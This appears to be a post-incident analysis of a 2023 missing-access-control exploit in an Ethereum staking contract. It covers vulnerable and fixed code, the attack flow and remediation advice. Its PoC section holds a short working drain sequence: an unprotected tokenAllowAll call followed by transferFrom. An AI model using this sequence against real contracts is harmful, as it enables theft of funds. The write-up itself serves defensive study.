# USDTStakingContract28 — Unlimited Approval Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-07-16 |
| **Protocol** | USDTStakingContract28 |
| **Chain** | Ethereum |
| **Loss** | ~$21K |
| **Attacker** | [0x000000915f1b10b0ef...](https://etherscan.io/address/0x000000915f1b10b0ef5c4efe696ab65f13f36e74) |
| **Attack Tx** | [0xfc872bf5ca8f04b18b...](https://etherscan.io/tx/0xfc872bf5ca8f04b18b82041ec563e4abf2e31e1fc27d1ea5dee39bc8a79d2d06) |
| **Vulnerable Contract** | [0xb754ebdba9b009113b...](https://etherscan.io/address/0xb754ebdba9b009113b4cf445a7cb0fc9227648ad) |
| **Root Cause** | `tokenAllowAll()` function externally callable, allowing arbitrary token approvals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/USDTStakingContract28_exp.sol) |

---
## 1. Vulnerability Overview

The `tokenAllowAll()` function of USDTStakingContract28 was callable by anyone externally. This allowed the attacker to grant themselves unlimited approval over the USDT held by the contract.

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable code: approval function callable by anyone
interface USDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
    // ❌ No access control — anyone can approve unlimited tokens to an arbitrary address
}

// ✅ Fixed code
function tokenAllowAll(address asset, address allowee) external onlyOwner {
    IERC20(asset).approve(allowee, type(uint256).max);
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: tokenAllowAll() function externally callable, allowing arbitrary token approvals
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  ├─① Directly calls tokenAllowAll(USDT, attacker)
  │       └─ No access control → succeeds
  ├─② Executes USDT.transferFrom(contract, attacker, balance)
  └─③ Drains entire contract USDT balance (~$21K)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Directly call the vulnerable function
USDTStakingContract28(target).tokenAllowAll(
    address(USDT),
    address(this) // Grant unlimited approval to attacker address
);
// Immediately drain via transferFrom after approval
USDT.transferFrom(address(target), address(this), USDT.balanceOf(address(target)));
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| Vulnerability Type | Missing Access Control |
| Severity | Critical |

---
## 6. Remediation Recommendations

1. Approval-related functions must require `onlyOwner` or multi-signature authorization
2. Approve only the required amount instead of unlimited approval (max)
3. Minimize token balances held within the contract

---
## 7. Lessons Learned

Token approval functions represent one of the most sensitive privileges. Strict access control is mandatory, and the principle of least privilege must be applied.